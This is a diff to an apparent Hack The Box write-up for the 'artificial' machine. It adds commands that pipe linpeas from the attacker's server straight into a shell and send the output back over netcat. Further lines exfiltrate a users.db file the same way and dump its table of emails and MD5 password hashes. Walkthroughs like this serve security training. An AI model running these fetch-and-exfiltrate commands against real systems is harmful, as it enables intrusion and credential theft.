@@ -286,16 +286,13 @@ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 sudo python3 -m http.server 8888
 ```
 
-Before running it, I need to setup a listener for the incoming data:
+Once that's done, I download linpeas on the box from my machine web server and run it from memory, sending the output my way:
 ```
-nc -lvnp 9999 > linpeas.out
-```
-
-Once that's done, I download linpeas on the box from my machine web server and run it from memory, sending the output to my machine:
-```
-curl 10.10.14.9:8888/linpeas.sh | sh | nc 10.10.14.9 9999
+nc -lvnp 9999 > linpeas.out # My machine
+curl 10.10.14.9:8888/linpeas.sh | sh | nc 10.10.14.9 9999 # Remote box
 ```
 
+I find some interesting informations.
 linpeas.out (shortened):
 ```
 ╔══════════╣ Active Ports
@@ -373,4 +370,30 @@ USER=app
 _=/usr/bin/dd
 _=/usr/bin/grep
 _=/usr/bin/xxd
+```
+
+I find `/home/app/app/instance/users.db` interesting, if the `gael` user has configured the app, his credentials might be in there.
+
+With this in mind, I transfer the database file to my machine:
+```
+nc -lvp 9999 > users.db # My machine
+cat /home/app/app/instance/users.db | nc 10.10.14.9 9999 # Remote box
+```
+
+Then, I open it:
+```
+$ sqlite3 users.db
+SQLite version 3.40.1 2022-12-28 14:03:47
+Enter ".help" for usage hints.
+sqlite> .tables
+model  user 
+sqlite> SELECT * FROM user;
+1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
+2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
+3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
+4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
+5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
+6|solomon|sol@mial.com|e10adc3949ba59abbe56e057f20f883e
+7|solo|solo@mail.com|827ccb0eea8a706c4c34a16891f84e7b
+8|hacker@htb.com|hacker@htb.com|000747de68d6f043504bbb3c01c42033
 ```
